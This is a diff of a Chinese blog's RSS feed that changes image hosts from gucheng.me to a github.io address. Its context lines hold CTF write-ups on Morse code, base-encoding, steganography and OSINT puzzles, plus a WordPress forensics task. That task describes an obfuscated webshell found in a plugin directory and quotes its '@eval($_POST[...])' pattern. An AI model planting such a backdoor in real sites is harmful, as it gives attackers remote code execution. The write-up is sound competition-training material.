 &lt;li&gt;双击左侧未命名混音项目后点击左上角，选择导出，多轨混音，整个会话，选择导出位置后直接导出&lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911204313875.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240911204313875.png&#34;
 	
 	
 	
@@ -4131,7 +5440,7 @@
 &lt;ol start=&#34;7&#34;&gt;
 &lt;li&gt;将生成的mp3拖入audacity，点击三个点，频谱图。然后按住ctrl滑动滚轮放大可以看到明显的摩斯码，抄下来解密即可&lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911204653922.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240911204653922.png&#34;
 	
 	
 	
@@ -4141,7 +5450,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911204903856.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240911204903856.png&#34;
 	
 	
 	
@@ -4154,7 +5463,7 @@
 &lt;hr&gt;
 &lt;h4 id=&#34;week2-base&#34;&gt;[Week2] Base?!
 &lt;/h4&gt;&lt;p&gt;这是一段xx-encode码，开始真没想到，随波逐流一把嗦即可&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911205308922.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240911205308922.png&#34;
 	
 	
 	
@@ -4166,7 +5475,7 @@
 &gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h4 id=&#34;week3-base-revenge&#34;&gt;[Week3] Base revenge
-&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911211205019.png&#34;
+&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240911211205019.png&#34;
 	
 	
 	
@@ -4178,7 +5487,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;将以上文本base64隐写解密得到&lt;code&gt;JnUaAFMFImgANSEuAWYuBE9SyaYpC2ldBrU9&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;将hint一键解码发现是atbash加密&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911211435511.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240911211435511.png&#34;
 	
 	
 	
@@ -4190,7 +5499,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;因为编码器解出来大小写有问题直接用[cyberchef](&lt;a class=&#34;link&#34; href=&#34;https://cyberchef.org/#recipe=Atbash_Cipher%28%29&amp;amp;input=Sm5VYUFGTUZJbWdBTlNFdUFXWXVCRTlTeWFZcEMybGRCclU5&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;Atbash Cipher - CyberChef&lt;/a&gt;)&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911212400039.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240911212400039.png&#34;
 	
 	
 	
@@ -4201,7 +5510,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;再base64解码即可&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911212445891.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240911212445891.png&#34;
 	
 	
 	
@@ -4218,7 +5527,7 @@
 &lt;h4 id=&#34;week3-外星信号&#34;&gt;[Week3] 外星信号
 &lt;/h4&gt;&lt;p&gt;音频播放就有莫斯码，先丢[在线网站](&lt;a class=&#34;link&#34; href=&#34;https://morsecode.world/international/decoder/audio-decoder-adaptive.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;Morse Code Adaptive Audio Decoder | Morse Code World&lt;/a&gt;)听一下,前半部分flag在这里面，要转换小写&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911213518068.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240911213518068.png&#34;
 	
 	
 	
@@ -4239,7 +5548,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;提取出摩斯码图片如下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/5bd2ebc5cd942d0ec16c41637a47bdcc_720.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/5bd2ebc5cd942d0ec16c41637a47bdcc_720.png&#34;
 	
 	
 	
@@ -4249,7 +5558,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/252798e7859a90919304b706d1787ba2.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/252798e7859a90919304b706d1787ba2.png&#34;
 	
 	
 	
@@ -4282,7 +5591,7 @@
 &lt;p&gt;路径示例：根据用户设置而定（如/wp-content/uploads/custom-directory/）
 说明：WordPress允许用户通过修改配置或安装特定插件来更改默认的上传目录。如果这些自定义目录的安全设置不当，就可能成为黑客上传webshell的潜在目标。&lt;/p&gt;&lt;/blockquote&gt;
 &lt;p&gt;然后再插件目录下确实发现了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/721257c325af60c1fad3c3bb319d6ec9.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/721257c325af60c1fad3c3bb319d6ec9.png&#34;
 	
 	
 	
@@ -4293,7 +5602,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;转字符串后发现读取ui.js文件的内容&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/d6179359916dfe6f25ba6ed27fea91bb.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/d6179359916dfe6f25ba6ed27fea91bb.png&#34;
 	
 	
 	
@@ -4304,7 +5613,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;目录下搜索ui.js，解码后发现很像@eval($_POST[&amp;rsquo;&amp;rsquo;])这种，但是传webshell的都使用了自定义函数和各种函数加编码，还是相当有水平的&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/fc1ba6fdd9631dea0b018b6c4ba6d907.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/fc1ba6fdd9631dea0b018b6c4ba6d907.png&#34;
 	
 	
 	
@@ -4315,7 +5624,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;连接密码提交不对？再回去一看原来还有层rot13，解密提交即可&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/8b45958918ed738b3cd27d15422d81b5.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/8b45958918ed738b3cd27d15422d81b5.png&#34;
 	
 	
 	
@@ -4332,7 +5641,7 @@
 &lt;ol&gt;
 &lt;li&gt;从图片导入qrcode-2.png&lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912161010793.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240912161010793.png&#34;
 	
 	
 	
@@ -4345,7 +5654,7 @@
 &lt;ol start=&#34;2&#34;&gt;
 &lt;li&gt;点击右上角tools&lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912161119087.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240912161119087.png&#34;
 	
 	
 	
@@ -4358,7 +5667,7 @@
 &lt;ol start=&#34;3&#34;&gt;
 &lt;li&gt;先选择爆破格式模式，然后再点击最上面提取信息&lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912161254572.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240912161254572.png&#34;
 	
 	
 	
@@ -4369,7 +5678,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;over&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912161333714.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240912161333714.png&#34;
 	
 	
 	
@@ -4383,7 +5692,7 @@
 &lt;h4 id=&#34;week4-小cheny的社交&#34;&gt;[Week4] 小cheny的社交
 &lt;/h4&gt;&lt;p&gt;这道题，嗯&amp;hellip;会了后有点没啥讲的了，我大体说下过程&lt;/p&gt;
 &lt;p&gt;stegsolve看到一串字符，base64解码后再转16进制ascii得到一个QQ&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912161642245.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240912161642245.png&#34;
 	
 	
 	
@@ -4395,7 +5704,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;搜索QQ在她空间发现尊嘟假嘟编码，用[](&lt;a class=&#34;link&#34; href=&#34;https://www.zdjd.asia/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;尊嘟假嘟O.o (zdjd.asia)&lt;/a&gt;)解码得到前半flag，然后还有个视频到b站搜评论下@了一个人点进去看到另外一串密文&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912162116753.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240912162116753.png&#34;
 	
 	
 	
@@ -4406,7 +5715,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;看着很像链接，用随波逐流梭哈搜索https发现链接&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912162213814.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240912162213814.png&#34;
 	
 	
 	
@@ -4469,35 +5778,35 @@
         </item>
         <item>
         <title>归档</title>
-        <link>http://gucheng.me/archives/</link>
+        <link>https://2477231995.github.io/archives/</link>
         <pubDate>Tue, 28 May 2019 00:00:00 +0000</pubDate>
         
-        <guid>http://gucheng.me/archives/</guid>
+        <guid>https://2477231995.github.io/archives/</guid>
         <description></description>
         </item>
         <item>
         <title>关于</title>
-        <link>http://gucheng.me/%E5%85%B3%E4%BA%8E/</link>
+        <link>https://2477231995.github.io/%E5%85%B3%E4%BA%8E/</link>
         <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
         
-        <guid>http://gucheng.me/%E5%85%B3%E4%BA%8E/</guid>
+        <guid>https://2477231995.github.io/%E5%85%B3%E4%BA%8E/</guid>
         <description>&lt;p&gt;This is a test page for i18n support.&lt;/p&gt;
 </description>
         </item>
         <item>
         <title>搜索</title>
-        <link>http://gucheng.me/search/</link>
+        <link>https://2477231995.github.io/search/</link>
         <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
         
-        <guid>http://gucheng.me/search/</guid>
+        <guid>https://2477231995.github.io/search/</guid>
         <description></description>
         </item>
         <item>
         <title>友情链接</title>
-        <link>http://gucheng.me/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/</link>
+        <link>https://2477231995.github.io/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/</link>
         <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
         
-        <guid>http://gucheng.me/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/</guid>
+        <guid>https://2477231995.github.io/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/</guid>
         <description></description>
         </item>
         
